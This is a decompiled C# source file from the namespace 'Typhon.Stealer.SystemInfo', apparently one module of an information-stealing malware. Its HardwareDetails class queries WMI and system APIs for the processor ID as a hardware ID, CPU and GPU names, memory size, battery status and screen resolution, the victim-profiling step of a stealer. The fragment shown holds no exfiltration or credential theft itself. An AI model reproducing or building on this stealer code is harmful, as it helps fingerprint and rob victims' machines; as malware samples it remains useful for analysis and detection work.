using System;
using System.Drawing;
using System.Management;
using System.Windows.Forms;

namespace Typhon.Stealer.SystemInfo
{
	// Token: 0x02000007 RID: 7
	internal class HardwareDetails
	{
		// Token: 0x0600001C RID: 28 RVA: 0x00002FFC File Offset: 0x000011FC
		public static string GetHWID()
		{
			try
			{
				using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("Select ProcessorId From Win32_processor").Get().GetEnumerator())
				{
					if (enumerator.MoveNext())
					{
						return ((ManagementObject)enumerator.Current)["ProcessorId"].ToString();
					}
				}
			}
			catch
			{
			}
			return "Unknown";
		}

		// Token: 0x0600001D RID: 29 RVA: 0x0000307C File Offset: 0x0000127C
		public static string GetProcessorName()
		{
			try
			{
				using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor").Get().GetEnumerator())
				{
					if (enumerator.MoveNext())
					{
						return ((ManagementObject)enumerator.Current)["Name"].ToString();
					}
				}
			}
			catch
			{
			}
			return "Unknown";
		}

		// Token: 0x0600001E RID: 30 RVA: 0x00003100 File Offset: 0x00001300
		public static string GetMemoryAmount()
		{
			try
			{
				int num = 0;
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * From Win32_ComputerSystem"))
				{
					using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
					{
						if (enumerator.MoveNext())
						{
							num = (int)(Convert.ToDouble(((ManagementObject)enumerator.Current)["TotalPhysicalMemory"]) / 1048576.0);
						}
					}
				}
				return num.ToString() + "MB";
			}
			catch
			{
			}
			return "-1";
		}

		// Token: 0x0600001F RID: 31 RVA: 0x000031B8 File Offset: 0x000013B8
		public static string GetGraphicsCard()
		{
			try
			{
				using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get().GetEnumerator())
				{
					if (enumerator.MoveNext())
					{
						return ((ManagementObject)enumerator.Current)["Name"].ToString();
					}
				}
			}
			catch
			{
			}
			return "Unknown";
		}

		// Token: 0x06000020 RID: 32 RVA: 0x0000323C File Offset: 0x0000143C
		public static string GetBatteryStatus()
		{
			try
			{
				string str = SystemInformation.PowerStatus.BatteryChargeStatus.ToString();
				string[] array = SystemInformation.PowerStatus.BatteryLifePercent.ToString().Split(new char[]
				{
					','
				});
				string str2 = array[array.Length - 1];
				return str + ", (" + str2 + "%)";
			}
			catch
			{
			}
			return "Unknown";
		}

		// Token: 0x06000021 RID: 33 RVA: 0x000032BC File Offset: 0x000014BC
		public static string GetScreenMetrics()
		{
			Rectangle bounds = Screen.GetBounds(Point.Empty);
			int width = bounds.Width;
			int height = bounds.Height;
			return width.ToString() + "x" + height.ToString();
		}
	}
}
